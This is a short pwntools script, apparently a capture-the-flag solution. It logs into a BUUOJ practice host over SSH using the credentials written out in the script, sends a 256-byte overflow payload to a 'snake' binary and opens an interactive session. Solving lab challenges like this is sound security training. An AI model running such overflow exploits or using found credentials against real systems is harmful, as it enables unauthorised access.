from pwn import *

s = ssh(host = 'node3.buuoj.cn', user = 'ctf', password = 'sNaKes', port = 26862)

io = s.process('/home/ctf/snake')
p = b'A' * 0x100
io.sendline(p)
io.interactive()
